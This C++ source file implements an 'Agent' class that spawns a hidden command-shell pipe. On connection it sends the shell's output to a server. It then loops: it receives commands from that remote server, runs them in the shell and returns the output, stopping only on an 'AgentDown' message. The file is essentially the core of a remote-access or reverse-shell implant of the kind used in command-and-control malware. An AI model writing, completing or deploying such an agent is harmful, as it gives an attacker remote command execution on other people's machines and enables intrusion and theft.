#include "Agent.h"

void Agent::OnConnect(Connection connection)
{
	Packet packet;
	console.Cmd2Buffer();

	std::string message = console.GetCmdOutput();

	packet.InsertString(message);
	connection.Send(packet);
}

// This is ugly need to change it and check the return value of console.<>
Agent::Agent()
{
	console.InitializeCmdPipe();
	console.Launch();
}

bool Agent::Logic(std::string command)
{
	Packet packet;
	
	if (not serverConn.Recv(packet))
	{
		std::cerr << "Agent::Logic::Recv Error." << std::endl;
		return false;
	}
	
	std::string msg = packet.ExtractString() + '\n';

	if (msg == "AgentDown\n")
	{
		std::cout << "[+] Shutting down agent..." << std::endl;
		return false;
	}

	if (not console.Buffer2Cmd(msg))
	{
		std::cerr << "Agent::Logic::Buffer2Cmd Error." << std::endl;
		return false;
	}
	
	if (not console.Cmd2Buffer())
	{
		std::cerr << "Agent::Logic::Cmd2Buffer Error." << std::endl;
		return false;
	}
	
	std::string cmdOutput = console.GetCmdOutput();

	packet.Clear();
	packet.InsertString(cmdOutput);

	if (not serverConn.Send(packet))
	{
		std::cerr << "Agent::Logic::Send Error." << std::endl;
		return false;
	}

	return true;
}
